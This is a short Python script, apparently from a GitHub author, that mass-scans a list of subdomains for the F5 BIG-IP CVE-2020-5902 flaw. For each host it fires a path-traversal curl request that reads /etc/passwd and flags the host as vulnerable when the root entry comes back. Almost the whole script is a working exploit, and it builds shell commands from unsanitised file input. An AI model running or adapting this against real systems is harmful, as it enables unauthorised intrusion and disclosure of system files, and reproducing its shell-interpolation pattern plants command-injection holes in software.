
import subprocess

author = """
Auhtor    : Pushpender Singh
Written In: Python 3
GitHub    : github.com/PushpenderIndia

"""

print(author)
print("[**********************************************************************]")
print("[*] Automated Scanner For F5 BIG IP CVE-2020-5902 Remote Code Execution")
print("[**********************************************************************]")

subdomains = input("[?] Enter Subdomain Path: ")
subdomains_list = []

with open(subdomains, 'r') as f:
    for subdomain in f.readlines():
        if subdomain != "\n":
            subdomains_list.append(subdomain.strip())
            
print(f"[>>] Total Subdomains Loaded: {len(subdomains_list)}")            

for subdomain in subdomains_list:
    try:
        exploit_using_curl = subprocess.check_output(f"curl -sk https://{subdomain}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", shell=True)
        if exploit_using_curl == b'':
            exploit_using_curl = subprocess.check_output(f"curl -sk http://{subdomain}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", shell=True)
    except Exception:
        exploit_using_curl = b'test_manual'
        
    if b'root:x:0:0:root' in exploit_using_curl:
        print(f"\033[0;31m[+] {subdomain} Vulnerable")
    
    elif b'test_manual' in exploit_using_curl:
        print(f"\33[97m[-] [Exception Occured, Try Manually] : {subdomain}")
        
    else:
        print(f"\033[0;32m[-] {subdomain} Not Vulnerable")   




     
